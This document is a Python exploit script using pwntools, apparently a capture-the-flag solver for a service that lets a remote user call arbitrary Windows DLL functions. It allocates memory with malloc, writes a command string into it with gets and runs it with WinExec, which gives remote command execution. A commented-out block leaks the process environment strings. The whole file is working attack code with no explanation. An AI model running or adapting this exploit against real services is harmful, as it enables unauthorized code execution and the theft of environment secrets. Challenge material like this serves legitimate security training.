#!/usr/bin/env python3

from pwn import *
import signal

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337


def handler(signum, frame):
    log.info('timed out')
    exit(0)

signal.signal(signal.SIGALRM, handler)
signal.alarm(30)
io = remote(HOST, int(PORT))

def call(module, func, arg, ret=True):
    io.recvline_contains(b'Which module would you like to load?')
    io.sendline(module)
    io.recvline_contains(b'What function do you want to call?')
    io.sendline(func)
    io.recvline_contains(b'What value do you want for the first argument?')
    io.sendline(str(arg).encode('ascii'))
    io.recvline_contains(b"Alright, we're calling it!")
    if ret:
        s = io.recvline_contains(b'Result:')
        s = s.split()[1]
        assert s.startswith(b'0x')
        x = int(s[2:], 16)
        return x

DATA = 0x14000f000

addr = call(b'msvcrt.dll', b'malloc', 1024)
print('some memory:', hex(addr))

call(b'msvcrt.dll', b'gets', addr, False)
io.sendline(b'submitter')
call(b'kernel32.dll', b'WinExec', addr, False)


# addr = call(b'kernel32.dll', b'GetEnvironmenaddrtStringsA', 0)
# print(hex(addr))

# while True:
#     call(b'msvcrt.dll', b'puts', addr, False)
#     env = io.recvline()[:-2]
#     print(env)
#     if not env:
#         break
#     addr += len(env) + 1

while True:
    print(io.recvline())